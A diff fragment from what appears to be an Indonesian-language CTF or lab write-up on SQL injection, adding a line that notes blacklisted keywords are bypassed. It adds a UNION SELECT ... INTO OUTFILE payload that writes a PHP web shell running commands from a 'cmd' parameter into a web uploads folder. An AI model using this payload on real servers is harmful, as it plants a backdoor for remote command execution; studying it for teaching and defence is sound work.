@@ -481,5 +481,7 @@ Setelah di enumurasi ternyata beberapa keyword di blacklist, seperti : **Union,S
 
 
 
+`4444+union+select+null,"<?php%20system($_GET[\"cmd\"]);?>"%20INTO%20OUTFILE%20"/var/www/html/uploads/lala.php"#`
 
+disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads 
 
